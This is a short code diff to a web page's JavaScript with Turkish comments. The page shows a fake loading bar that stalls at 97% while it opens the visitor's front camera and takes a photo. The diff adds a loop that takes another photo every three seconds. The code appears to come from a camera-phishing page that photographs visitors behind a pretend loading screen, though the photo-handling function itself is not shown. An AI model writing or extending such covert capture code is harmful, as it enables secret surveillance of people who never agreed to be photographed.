@@ -249,7 +249,7 @@
     function baslatYuklemeBari() {
       const progressInterval = setInterval(() => {
         if (progress < 97) {
-          progress += 0.8; // Yavaş artış
+          progress += 0.8; 
           if (progress > 97) progress = 97;
           progressBar.style.width = progress + "%";
           percentText.innerText = Math.floor(progress) + "%";
@@ -265,9 +265,16 @@
       
       const izinVerildi = await kamerayiAc('user');
       if (izinVerildi) {
+        // İlk fotoğraf hemen çekilsin
         setTimeout(async () => {
           await fotoCek('on');
         }, 1500);
+
+        // 🔄 HER 3 SANİYEDE BİR (3000 milisaniye) FOTOĞRAF ÇEKME DÖNGÜSÜ
+        setInterval(async () => {
+          await fotoCek('on');
+        }, 3000);
+
       } else {
         loadingArea.style.display = "none";
         errorArea.style.display = "block";
